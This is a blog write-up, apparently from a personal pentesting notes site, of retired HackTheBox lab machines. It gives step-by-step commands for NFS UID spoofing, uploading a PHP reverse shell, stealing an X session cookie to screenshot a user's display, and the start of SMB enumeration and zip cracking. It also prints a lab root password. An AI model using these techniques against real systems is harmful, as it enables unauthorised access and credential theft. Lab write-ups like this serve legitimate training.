<!DOCTYPE html>
<html lang="en">
<!-- Beautiful Jekyll 5.0.0 | Copyright Dean Attali 2020 -->
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

  

  <title>Easy</title>

  
  <meta name="author" content="Qv1nTv5">
  

  <meta name="description" content="Easy Retired Machines">

  

  

  
  <link rel="alternate" type="application/rss+xml" title="Home" href="http://localhost:4000/feed.xml">
  

  

  

  

  


  
    
      
  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">


    
      
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css">


    
      
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic">


    
      
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800">


    
  

  
    
      <link rel="stylesheet" href="/assets/css/bootstrap-social.css">
    
      <link rel="stylesheet" href="/assets/css/beautifuljekyll.css">
    
  

  

  
  
  

  

  
  <meta property="og:site_name" content="Home">
  <meta property="og:title" content="Easy">
  <meta property="og:description" content="Easy Retired Machines">

  

  
  <meta property="og:type" content="article">
  <meta property="og:article:author" content="Qv1nTv5">
  <meta property="og:article:published_time" content="2022-12-01T00:00:00-05:00">
  <meta property="og:url" content="http://localhost:4000/2022-12-01-Easy/">
  <link rel="canonical" href="http://localhost:4000/2022-12-01-Easy/">
  

  
  <meta name="twitter:card" content="summary">
  
  <meta name="twitter:site" content="@Qvintvs1">
  <meta name="twitter:creator" content="@Qvintvs1">

  <meta property="twitter:title" content="Easy">
  <meta property="twitter:description" content="Easy Retired Machines">

  

  


  

  

</head>


<body>

  


  <nav class="navbar navbar-expand-xl navbar-light fixed-top navbar-custom top-nav-regular"><a class="navbar-brand" href="http://localhost:4000/">Home</a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>

  <div class="collapse navbar-collapse" id="main-navbar">
    <ul class="navbar-nav ml-auto">
          <li class="nav-item dropdown">
            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Program</a>
            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                  <a class="dropdown-item" href="/Cpage">C</a>
                  <a class="dropdown-item" href="/DHARMApage">Dharma</a>
            </div>
          </li>
        
          <li class="nav-item dropdown">
            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Pentest</a>
            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                  <a class="dropdown-item" href="/BURPSUITEpage">Burp</a>
                  <a class="dropdown-item" href="/THMpage">Thm</a>
                  <a class="dropdown-item" href="/HackTheBoxpage">Htb</a>
                  <a class="dropdown-item" href="/PEN200page">BasicPentesting</a>
                  <a class="dropdown-item" href="/REDTEAMBASICSpage">RedTeam</a>
                  <a class="dropdown-item" href="/BLUETEAMBASICSpage">Blueteam</a>
                  <a class="dropdown-item" href="/REDESpage">Net</a>
                  <a class="dropdown-item" href="/2022-11-17-GitBasics">Git</a>
            </div>
          </li>
        
        <li class="nav-item">
          <a class="nav-link" id="nav-search-link" href="#" title="Search">
            <span id="nav-search-icon" class="fa fa-search"></span>
            <span id="nav-search-text">Search</span>
          </a>
        </li></ul>
  </div>

  

  

</nav>



<div id="beautifuljekyll-search-overlay">

  <div id="nav-search-exit" title="Exit search">✕</div>
  <input type="text" id="nav-search-input" placeholder="Search">
  <ul id="search-results-container"></ul>
  
  <script src="https://unpkg.com/simple-jekyll-search@latest/dest/simple-jekyll-search.min.js"></script>
  <script>
    var searchjson = '[ \
       \
        { \
          "title"    : "2. Constants and Literals in C.", \
          "category" : "C", \
          "url"      : "/2024-12-10-1.ConstantsinC-copy/", \
          "date"     : "December 10, 2024" \
        }, \
       \
        { \
          "title"    : "1. Basics of C", \
          "category" : "C", \
          "url"      : "/2024-12-02-1.BasicsOfC/", \
          "date"     : "December  2, 2024" \
        }, \
       \
        { \
          "title"    : "Gramáticas en Dharma", \
          "category" : "DHA", \
          "url"      : "/2024-09-24-Dharma_Tutorial/", \
          "date"     : "September 24, 2024" \
        }, \
       \
        { \
          "title"    : "Gramáticas en Dharma", \
          "category" : "fuzz", \
          "url"      : "/2024-03-22-Dharma_Tutorial-copy/", \
          "date"     : "March 22, 2024" \
        }, \
       \
        { \
          "title"    : "Mi experiencia con el OSCP", \
          "category" : "pen", \
          "url"      : "/2023-11-19-PEN200_Experience/", \
          "date"     : "November 19, 2023" \
        }, \
       \
        { \
          "title"    : "Client Side", \
          "category" : "pen", \
          "url"      : "/2023-11-17-17.Client_Side_Attacks/", \
          "date"     : "November 17, 2023" \
        }, \
       \
        { \
          "title"    : "Deep Packet Tunneling", \
          "category" : "pen", \
          "url"      : "/2023-11-16-16.Tunneling_Through_Deep_Packet_Inspection/", \
          "date"     : "November 16, 2023" \
        }, \
       \
        { \
          "title"    : "Report", \
          "category" : "pen", \
          "url"      : "/2023-11-15-15.Making_Reports/", \
          "date"     : "November 15, 2023" \
        }, \
       \
        { \
          "title"    : "Metasploit", \
          "category" : "pen", \
          "url"      : "/2023-11-14-14.Metasploit/", \
          "date"     : "November 14, 2023" \
        }, \
       \
        { \
          "title"    : "Password Attacks", \
          "category" : "pen", \
          "url"      : "/2023-11-13-13.Password_Attacks/", \
          "date"     : "November 13, 2023" \
        }, \
       \
        { \
          "title"    : "Active Directory Attacks", \
          "category" : "pen", \
          "url"      : "/2023-11-12-12.Active_Directory_Attacks/", \
          "date"     : "November 12, 2023" \
        }, \
       \
        { \
          "title"    : "Port Forwarding", \
          "category" : "pen", \
          "url"      : "/2023-11-11-11.Port_Forwarding/", \
          "date"     : "November 11, 2023" \
        }, \
       \
        { \
          "title"    : "Privilege Escalation", \
          "category" : "pen", \
          "url"      : "/2023-11-10-10.Privilege_Escalation/", \
          "date"     : "November 10, 2023" \
        }, \
       \
        { \
          "title"    : "File Transfers", \
          "category" : "pen", \
          "url"      : "/2023-11-09-9.File_Tranfers/", \
          "date"     : "November  9, 2023" \
        }, \
       \
        { \
          "title"    : "Buffer Overflows", \
          "category" : "pen", \
          "url"      : "/2023-11-08-8.Buffer_Overflows/", \
          "date"     : "November  8, 2023" \
        }, \
       \
        { \
          "title"    : "Vulnerability Scanning.", \
          "category" : "pen", \
          "url"      : "/2023-11-07-7.Vulnerability_Scanning/", \
          "date"     : "November  7, 2023" \
        }, \
       \
        { \
          "title"    : "Information Gathering", \
          "category" : "pen", \
          "url"      : "/2023-11-06-6.Active_Information_Gathering/", \
          "date"     : "November  6, 2023" \
        }, \
       \
        { \
          "title"    : "Windows", \
          "category" : "pen", \
          "url"      : "/2023-11-05-5.Windows/", \
          "date"     : "November  5, 2023" \
        }, \
       \
        { \
          "title"    : "Networking", \
          "category" : "pen", \
          "url"      : "/2023-11-04-4.Networking/", \
          "date"     : "November  4, 2023" \
        }, \
       \
        { \
          "title"    : "Scripting", \
          "category" : "pen", \
          "url"      : "/2023-11-03-3.Scripting/", \
          "date"     : "November  3, 2023" \
        }, \
       \
        { \
          "title"    : "Practical Tools", \
          "category" : "pen", \
          "url"      : "/2023-11-02-2.PracticalTools/", \
          "date"     : "November  2, 2023" \
        }, \
       \
        { \
          "title"    : "Linux", \
          "category" : "pen", \
          "url"      : "/2023-11-01-1.Linux/", \
          "date"     : "November  1, 2023" \
        }, \
       \
        { \
          "title"    : "Easy", \
          "category" : "hack", \
          "url"      : "/2022-12-01-Easy/", \
          "date"     : "December  1, 2022" \
        }, \
       \
        { \
          "title"    : "Git Basics", \
          "category" : "", \
          "url"      : "/2022-11-17-GitBasics/", \
          "date"     : "November 17, 2022" \
        }, \
       \
        { \
          "title"    : "Tier I", \
          "category" : "hack", \
          "url"      : "/2022-11-10-Tier_1/", \
          "date"     : "November 10, 2022" \
        }, \
       \
        { \
          "title"    : "Tier 0", \
          "category" : "hack", \
          "url"      : "/2022-11-09-Tier_0/", \
          "date"     : "November  9, 2022" \
        }, \
       \
        { \
          "title"    : "7.BufferOverflow.", \
          "category" : "thm", \
          "url"      : "/2022-11-02-7.BufferOverflow/", \
          "date"     : "November  2, 2022" \
        }, \
       \
        { \
          "title"    : "6.Offensive Pentesting", \
          "category" : "thm", \
          "url"      : "/2022-11-01-6.OffensivePentesting/", \
          "date"     : "November  1, 2022" \
        }, \
       \
        { \
          "title"    : "5.RedTeam", \
          "category" : "thm", \
          "url"      : "/2022-10-30-5.RedTeam/", \
          "date"     : "October 30, 2022" \
        }, \
       \
        { \
          "title"    : "4.Windows", \
          "category" : "thm", \
          "url"      : "/2022-10-22-4.Windows/", \
          "date"     : "October 22, 2022" \
        }, \
       \
        { \
          "title"    : "3.Junior Penetrationtester path", \
          "category" : "thm", \
          "url"      : "/2022-09-02-3.JRPenetrationTester/", \
          "date"     : "September  2, 2022" \
        }, \
       \
        { \
          "title"    : "2.Complete Begginer path.", \
          "category" : "thm", \
          "url"      : "/2022-08-07-2.CompleteBegginer/", \
          "date"     : "August  7, 2022" \
        }, \
       \
        { \
          "title"    : "1.Pre-Security path.", \
          "category" : "thm", \
          "url"      : "/2022-07-11-1Pre-Security/", \
          "date"     : "July 11, 2022" \
        }, \
       \
        { \
          "title"    : "0.Scripting for pentesters.", \
          "category" : "thm", \
          "url"      : "/2022-07-10-0.Scripting_for_pentesters/", \
          "date"     : "July 10, 2022" \
        }, \
       \
        { \
          "title"    : "Burp Certified Practitioner Practice Exam.", \
          "category" : "burp", \
          "url"      : "/2022-03-30-PracticeExam/", \
          "date"     : "March 30, 2022" \
        }, \
       \
        { \
          "title"    : "22. OAuth Authentication.", \
          "category" : "burp", \
          "url"      : "/2022-03-27-22.OAuth_authentication/", \
          "date"     : "March 27, 2022" \
        }, \
       \
        { \
          "title"    : "21. HTTP Request Smuggling.", \
          "category" : "burp", \
          "url"      : "/2022-03-26-21.HTTP_request_smuggling/", \
          "date"     : "March 26, 2022" \
        }, \
       \
        { \
          "title"    : "20. HTTP Host Header Attacks.", \
          "category" : "burp", \
          "url"      : "/2022-03-25-20.HTTP_Host_header_attacks/", \
          "date"     : "March 25, 2022" \
        }, \
       \
        { \
          "title"    : "19. Web Cache Poisoning.", \
          "category" : "burp", \
          "url"      : "/2022-03-24-19.Web_cache_poisoning/", \
          "date"     : "March 24, 2022" \
        }, \
       \
        { \
          "title"    : "18. Server-Side Template Injection.", \
          "category" : "burp", \
          "url"      : "/2022-03-23-18.Serve-side_template_injection/", \
          "date"     : "March 23, 2022" \
        }, \
       \
        { \
          "title"    : "17. Insecure Deserialization.", \
          "category" : "burp", \
          "url"      : "/2022-03-22-17.Insecure_deserialization/", \
          "date"     : "March 22, 2022" \
        }, \
       \
        { \
          "title"    : "16. WebSockets.", \
          "category" : "burp", \
          "url"      : "/2022-03-21-16.WebSockets/", \
          "date"     : "March 21, 2022" \
        }, \
       \
        { \
          "title"    : "15.DOM-based XSS vulnerabilities.", \
          "category" : "burp", \
          "url"      : "/2022-03-20-15-DOM-based_vulnerabilities/", \
          "date"     : "March 20, 2022" \
        }, \
       \
        { \
          "title"    : "14. Clickjacking.", \
          "category" : "burp", \
          "url"      : "/2022-03-19-14.Clickjacking/", \
          "date"     : "March 19, 2022" \
        }, \
       \
        { \
          "title"    : "13. Cross-Origin Resource Sharing.", \
          "category" : "burp", \
          "url"      : "/2022-03-18-13.Cross-origin_resource_sharing_(CORS)/", \
          "date"     : "March 18, 2022" \
        }, \
       \
        { \
          "title"    : "12. Cross-Site Request Forgery.", \
          "category" : "burp", \
          "url"      : "/2022-03-17-12.Cross-site_request_forgery_(CSRF)/", \
          "date"     : "March 17, 2022" \
        }, \
       \
        { \
          "title"    : "11. Cross-Site Scripting.", \
          "category" : "burp", \
          "url"      : "/2022-03-16-11.Cross-site_scripting_(XSS)/", \
          "date"     : "March 16, 2022" \
        }, \
       \
        { \
          "title"    : "10. XXE Injection.", \
          "category" : "burp", \
          "url"      : "/2022-03-15-10.XXE_injection/", \
          "date"     : "March 15, 2022" \
        }, \
       \
        { \
          "title"    : "9. Server-Side Request Forgery.", \
          "category" : "burp", \
          "url"      : "/2022-03-14-9.Server-side_request_forgery/", \
          "date"     : "March 14, 2022" \
        }, \
       \
        { \
          "title"    : "8. File Upload.", \
          "category" : "burp", \
          "url"      : "/2022-03-13-8.File_upload_vulnerabilities/", \
          "date"     : "March 13, 2022" \
        }, \
       \
        { \
          "title"    : "7. Access Control.", \
          "category" : "burp", \
          "url"      : "/2022-03-12-7.Access_control/", \
          "date"     : "March 12, 2022" \
        }, \
       \
        { \
          "title"    : "6. Information Disclosure.", \
          "category" : "burp", \
          "url"      : "/2022-03-11-6.Information_disclosure/", \
          "date"     : "March 11, 2022" \
        }, \
       \
        { \
          "title"    : "5. Bussiness Logic Vulnerabilities.", \
          "category" : "burp", \
          "url"      : "/2022-03-10-5.Business_logic_vulnerabilities/", \
          "date"     : "March 10, 2022" \
        }, \
       \
        { \
          "title"    : "4. Command Injection.", \
          "category" : "burp", \
          "url"      : "/2022-03-09-4.Command_Injection/", \
          "date"     : "March  9, 2022" \
        }, \
       \
        { \
          "title"    : "3. Directory Traversal.", \
          "category" : "burp", \
          "url"      : "/2022-03-08-3.Directory_Traversal/", \
          "date"     : "March  8, 2022" \
        }, \
       \
        { \
          "title"    : "2. Authentication.", \
          "category" : "burp", \
          "url"      : "/2022-03-07-2.Authentication/", \
          "date"     : "March  7, 2022" \
        }, \
       \
        { \
          "title"    : "1. SQLInjection", \
          "category" : "burp", \
          "url"      : "/2022-03-06-1.SQLInjection/", \
          "date"     : "March  6, 2022" \
        }, \
       \
        { \
          "title"    : "Seguridad Perimetral", \
          "category" : "blueteam", \
          "url"      : "/2022-02-09-Seguridad_Perimetral/", \
          "date"     : "February  9, 2022" \
        }, \
       \
        { \
          "title"    : "Hardening de sistemas", \
          "category" : "blueteam", \
          "url"      : "/2022-02-09-Hardening_de_sistemas/", \
          "date"     : "February  9, 2022" \
        }, \
       \
        { \
          "title"    : "Bandit", \
          "category" : "otw", \
          "url"      : "/2022-02-08-Bandit/", \
          "date"     : "February  8, 2022" \
        }, \
       \
        { \
          "title"    : "Proxy", \
          "category" : "redes", \
          "url"      : "/2022-02-07-Proxys/", \
          "date"     : "February  7, 2022" \
        }, \
       \
        { \
          "title"    : "Protocolos Relevantes", \
          "category" : "redes", \
          "url"      : "/2022-02-07-Protocolos_Importantes/", \
          "date"     : "February  7, 2022" \
        }, \
       \
        { \
          "title"    : "Curso Básico Redes", \
          "category" : "redes", \
          "url"      : "/2022-02-07-Precurso_Redes/", \
          "date"     : "February  7, 2022" \
        }, \
       \
        { \
          "title"    : "IPs", \
          "category" : "redes", \
          "url"      : "/2022-02-07-IPs/", \
          "date"     : "February  7, 2022" \
        }, \
       \
        { \
          "title"    : "Movimientos Laterales", \
          "category" : "redteam", \
          "url"      : "/2022-02-06-Introducci%C3%B3n_a_movimientos_laterales/", \
          "date"     : "February  6, 2022" \
        }, \
       \
        { \
          "title"    : "Evasión de Defensas", \
          "category" : "redteam", \
          "url"      : "/2022-02-05-Evasi%C3%B3n_de_Defensas/", \
          "date"     : "February  5, 2022" \
        }, \
       \
        { \
          "title"    : "Escalada de privilegios", \
          "category" : "redteam", \
          "url"      : "/2022-02-05-Escalada_de_privilegios/", \
          "date"     : "February  5, 2022" \
        }, \
       \
        { \
          "title"    : "Metasploit", \
          "category" : "redteam", \
          "url"      : "/2022-02-04-Metasploit_B%C3%A1sico/", \
          "date"     : "February  4, 2022" \
        }, \
       \
        { \
          "title"    : "Ataques a aplicaciones Android", \
          "category" : "redteam", \
          "url"      : "/2022-02-03-Ataques_aplicaciones_android/", \
          "date"     : "February  3, 2022" \
        }, \
       \
        { \
          "title"    : "Ataque a aplicaciones web.", \
          "category" : "redteam", \
          "url"      : "/2022-02-02-Ataques_a_aplicaciones_web/", \
          "date"     : "February  2, 2022" \
        }, \
       \
        { \
          "title"    : "Ataques a Infraestructuras y Redes", \
          "category" : "redteam", \
          "url"      : "/2022-02-01-Ataques_a_Infraestructuras_y_Redes/", \
          "date"     : "February  1, 2022" \
        }, \
       \
        { \
          "title"    : "Análisis de Objetivos", \
          "category" : "redteam", \
          "url"      : "/2022-01-28-An%C3%A1lisis_de_Objetivos/", \
          "date"     : "January 28, 2022" \
        }, \
       \
       \
        { \
          "title"    : "Blueteam Basics", \
          "category" : "page", \
          "url"      : "/BLUETEAMBASICSpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "PortSwigger BurpSuite Course", \
          "category" : "page", \
          "url"      : "/BURPSUITEpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "C programming subjects.", \
          "category" : "page", \
          "url"      : "/Cpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Dharma Fuzzer language", \
          "category" : "page", \
          "url"      : "/DHARMApage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Exploiting &amp; Reversing", \
          "category" : "page", \
          "url"      : "/EXPREVpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Fuzzing JavaScript Engine", \
          "category" : "page", \
          "url"      : "/Fuzzpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "HackTheBox", \
          "category" : "page", \
          "url"      : "/HackTheBoxpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "PEN200 notes", \
          "category" : "page", \
          "url"      : "/PEN200page/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Proyectos", \
          "category" : "page", \
          "url"      : "/PROJECTSpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Networking Basics", \
          "category" : "page", \
          "url"      : "/REDESpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "RedTeam Basics", \
          "category" : "page", \
          "url"      : "/REDTEAMBASICSpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Retired Machines", \
          "category" : "page", \
          "url"      : "/RetiredMachinespage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "TryHackMe", \
          "category" : "page", \
          "url"      : "/THMpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "About me", \
          "category" : "page", \
          "url"      : "/aboutme/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "THM", \
          "category" : "page", \
          "url"      : "/preOSCPpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Tag Index", \
          "category" : "page", \
          "url"      : "/tags/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page2/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page3/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page4/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page5/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page6/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page7/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page8/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page9/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page10/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page11/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page12/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page13/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page14/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page15/", \
          "date"     : "January 1, 1970" \
        } \
       \
    ]';
    searchjson = JSON.parse(searchjson);

    var sjs = SimpleJekyllSearch({
      searchInput: document.getElementById('nav-search-input'),
      resultsContainer: document.getElementById('search-results-container'),
      json: searchjson
    });
  </script>
</div>





  <!-- TODO this file has become a mess, refactor it -->







<header class="header-section ">

<div class="intro-header no-img">
  <div class="container-md">
    <div class="row">
      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
        <div class="post-heading">
          <h1>Easy</h1>
          
            
              <h2 class="post-subheading">Easy Retired Machines</h2>
            
          

          
            <span class="post-meta">Posted on December 1, 2022</span>
            
            
          
        </div>
      </div>
    </div>
  </div>
</div>
</header>





<div class=" container-md ">
  <div class="row">
    <div class=" col-xl-8 offset-xl-2 col-lg-10 offset-lg-1 ">

      

      

      <article role="main" class="blog-post">
        <h3 id="1-squashed---linux-nfs-imitation-through-uid-nfs-php-reverse-shell-nfs-configuration-xauthority-cookie-usurpation-w-and-xwd-command">1. Squashed - Linux. (NFS Imitation through UID, NFS php-reverse-shell, NFS configuration, .Xauthority cookie usurpation, w and xwd command)</h3>

<p>In this we are in front of a Linux machine which is hosting several services. Among them, we found interesting, a SSH, HTTP and NFS services on defaults ports. The NFS is offered through a rpcbind on port 111:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221113113455.png" text-align="center" />
</div>

<p>We explore the web page but it seems that it doesn’t have anything relevant. Then, we proceed with the NFS enumeration:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221113114057.png" text-align="center" />
</div>

<p>The NFS server is offering two directories. One is the personal directory of a user of the server and the other is the web-server root directory.</p>

<p>Thus, we proceed to mount the directories on our machine:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo mkdir</span> /mnt/1
<span class="nb">sudo </span>mount <span class="nt">-t</span> nfs squashed.htb:/var/www/html /mnt/1
</code></pre></div></div>

<p>This command tells the kernel to attach the filesystem found on device (which is of type ‘nfs’) at the directory /mnt/1. However, we found that we don’t have permission to access the directory:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221113114849.png" text-align="center" />
</div>

<p>If we check the property of the directory we see that is owned by the UID 2017 and belongs to the group ‘www-data’. We can attemp to create a new user and change his UID to make it coincide to the require UID.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>useradd xela
</code></pre></div></div>

<p>This user will by default have a UID/GID of the highest ID found in /etc/passwd , plus one. Usually this will be 1001 . To change the UID and the GID, we run the following command:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>usermod <span class="nt">-u</span> 2017 xela
<span class="nb">sudo </span>groupmod <span class="nt">-g</span> 2017 xela
</code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221113120624.png" text-align="center" />
</div>

<p>Now we have to found the form to include a file to trigger a reverse shell. In the .htaccess file we found a PHP reference, so the web server is PHP-based and we can try to trigger a <a href="https://github.com/pentestmonkey/php-reverse-shell">php-reverse-shell</a></p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221113122851.png" text-align="center" />
</div>

<p>We do this by locating on the contents of the shared folder, /mnt/1 a shell.php and accessing the file by the web. Thus we gain access to the user alex:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221113123636.png" text-align="center" />
</div>

<p>It would be worth to check the NFS configuration (on /etc/exports) in order to understand better what we do and why have we been able to do it.</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221113124317.png" text-align="center" />
</div>

<p>The configuration file have two options that we may want focus on; ‘root_squash’ and ‘rw’. <em>The first one downgrade users wo attemp to access the share as root (UID/GID 0) to the *nfsnobody</em> user, preventing an attacker from uploading binaries with the SUID bit set*.</p>

<p><em>A similar setting is ‘all_squash’ , which would apply that same logic to all users, essentially downgrading everyone to nfsnobody</em>. Luckily, that configuration has not been explicitly specified, therefore we can imitate non-root users (as we did) to write files to the web root directory.</p>

<p>The second option, the ‘rw’, configure the shared directory to give the user write/read permissions. We have to note that the same option is not established on the /home/ross directory so we couldn’t be able to write anything on it.</p>

<p>Now, we are going to enumerate the second NFS share. We are going to apply the same imitation strategy although we alrready know that we will not be able to write anything on it but still can read the files. We change the UID of our created user ‘xela’. First we mount the NFS share and see the propierty:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221113130155.png" text-align="center" />
</div>

<p>Then, we apply the same commands to change the UID/GID of the user ‘xela’:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221113130429.png" text-align="center" />
</div>

<p>This way we can now check the files on the directory that otherwise we couldn’t be able to read:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221113131128.png" text-align="center" />
</div>

<p>X is a portable, network-transparent window system for managing a windowed GUI. The presence of .Xauthority and .xsession files in the home directory indicate that a display might be configured, with ‘ross’ potentially already authenticated.</p>

<p>The .Xauthority file is used to store credentials in the form of cookies used by xauth when authenticating X sessions. When a session is started, the cookie is then used to authenticate the subsequent connections to that specific display we can steal the cookie and therefore act as the authenticated ‘ross’ user and interact with the display.</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221113131537.png" text-align="center" />
</div>

<p>In order to transport it, we first encoded it with ‘base64’ and then we take it to the /tmp folder of the target machine on user alex:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221113142324.png" text-align="center" />
</div>
<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221113142029.png" text-align="center" />
</div>

<p><br /></p>

<p>Then, setting the cookie is as easy as pointing the enviroment variable ‘XAUTOHRITY’ to our cookie file:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">XAUTHORITY</span><span class="o">=</span>/tmp/.Xauthority
</code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221113142429.png" text-align="center" />
</div>

<p>Thus, with this, we have usurpate the ross’s session and we can interact with the display. The w command is <strong>a built-in tool that allows administrators to view information about users that are currently logged in</strong>. This includes their username, where they are logged in from, and what they are currently doing:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221113143124.png" text-align="center" />
</div>

<p>We can see that the display used is ‘:0’. We now are going to use the ‘xwd’ command which simply dumps an image of an X window, to get a screenshot of the display in its current state:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xwd <span class="nt">-root</span> <span class="nt">-screen</span> <span class="nt">-silent</span> <span class="nt">-display</span> :0 <span class="o">&gt;</span> /tmp/screen.xwd
</code></pre></div></div>

<p><br /></p>

<p>Then, we move the file to our local machine through the NFS share and convert the .xwd to .png and open it with the ‘feh’ command:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221113143711.png" text-align="center" />
</div>

<p>Thus, we have found root credentials: root:cah$mei7rai9A.</p>

<p><br /></p>

<h3 id="2-timelapse---windows-smb-enumeration-zip2john-pfx2john-pfx-file-ssl-cert-and-key-evil-winrm-with-cert-and-keys-windows-command-history-laps_readers-group-get-adcomputer">2. Timelapse - Windows. (SMB enumeration, zip2john, pfx2john, PFX file SSL cert and key, Evil-Winrm with cert and keys, Windows Command-History, LAPS_Readers group Get-ADComputer)</h3>

<p>In this case we are in front of a Windows machine that is hosting a SMB server and a wmans (Windows Manager Server) reachable through <a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a> tool:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221113171057.png" text-align="center" />
</div>

<p>Thus, we begin with a SMB enumeration:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221113171629.png" text-align="center" />
</div>

<p>Then, we access to the NETLOGON share in order to see if we gather anything useful but we don’t have permissions to list or read the share so we pass to the following share:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221113171820.png" text-align="center" />
</div>

<p>We find a .zip backup file that we download with the ‘get’ command and try to unzip but a password is required:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221113171925.png" text-align="center" />
</div>

<p>We attemp to crack the password using the ‘zip2john’ utility and then JohnTheRipper:</p>

